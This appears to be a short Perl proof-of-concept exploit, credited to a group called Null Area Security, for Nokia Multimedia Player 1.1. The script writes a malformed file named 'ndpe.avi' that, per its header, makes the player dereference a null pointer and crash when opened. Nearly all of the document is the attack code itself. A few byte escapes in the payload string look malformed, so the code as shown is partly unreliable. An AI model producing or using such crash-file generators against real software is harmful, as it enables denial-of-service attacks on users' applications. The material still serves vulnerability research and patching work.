#!/usr/local/bin/perl
#
# Application    : Nokia Multimedia Player
# Version        : v 1.1
# Bug            : Local (.AVI File) Null Dereference Pointer Exploit
# Exploit Method : Local
# Author         : Null Area Security
#                  Zigma [zigmatn @ gmail.com]
# IRC            : irc://irc.nullarea.org/#nullarea
# Home           : http://NullArea.NET
#
# Description    : Opening a malformed .AVI file with Nokia Multimedia Player version 1.1 causes it to point to Null Pointer [00000000] which leads to crash the application .
#
# " Access violation when reading [00000000] - "
#
$area = "ndpe.avi";

$null = "\x4A\x75\x73\x74\x00\x41\x6E\x79\x74\x68\x69\6E\x76\x00".
        "\x54\x75\x6E\x96\73\x69\x61\x00\x52\x75\x6C\x6C\x7A\x7A";

print "\nFuzzing Nokia Multimedia Player v 1.1\r";
print "\n\n[+] Evil file to make : $area ...\r\n";
sleep(2);

open(avi, ">./$area") || die "\nCannot open $area: $!";

print avi "$null";

close (avi);

print "\n[+] File $area successfully created!\r\n";

